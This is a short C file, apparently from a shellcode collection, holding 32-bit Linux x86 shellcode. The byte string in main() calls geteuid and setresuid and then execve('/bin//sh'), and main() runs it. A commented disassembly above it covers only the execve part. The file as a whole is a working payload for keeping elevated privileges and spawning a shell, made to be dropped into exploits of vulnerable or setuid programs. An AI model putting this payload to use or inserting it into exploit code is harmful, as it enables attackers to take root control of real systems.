/*

08049640 <shellcode>:

 8049653:   31 c0                   xor    %eax,%eax
 8049655:   50                      push   %eax
 8049656:   68 6e 2f 73 68          push   $0x68732f6e
 804965b:   68 2f 2f 62 69          push   $0x69622f2f
 8049660:   89 e3                   mov    %esp,%ebx
 8049662:   50                      push   %eax                 #
 8049663:   89 e2                   mov    %esp,%edx            #
 8049665:   53                      push   %ebx                 #
 8049666:   89 e1                   mov    %esp,%ecx            #
 8049668:   b0 0b                   mov    $0xb,%al
 804966a:   cd 80                   int    $0x80

*/

/*
*/

int main(void) {
    char *shellcode = "\x90\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x89\xc2\x31\xc0\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    (*(void(*)()) shellcode)();
}
